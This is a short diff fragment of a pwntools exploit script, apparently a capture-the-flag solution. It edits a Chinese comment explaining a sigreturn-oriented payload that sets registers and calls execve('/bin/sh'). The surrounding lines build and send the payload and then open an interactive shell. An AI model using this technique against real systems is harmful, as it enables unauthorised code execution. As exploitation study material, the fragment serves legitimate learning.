@@ -20,7 +20,7 @@ frame.rip = syscall
 frame.rsi = 0
 frame.rdx = 0
 
-# 调用rt_sigreturn函数设置寄存器的值执行syscall
+# 执行syscall调用rt_sigreturn函数设置寄存器的值然后执行59号系统中断(execve("/bin/sh", 0, 0))
 payload2 = b'/bin/sh\0x00'.ljust(0x10, b'a') + p64(mov_rax_15) + p64(syscall) + bytes(frame)
 p.send(payload2)
 p.interactive()
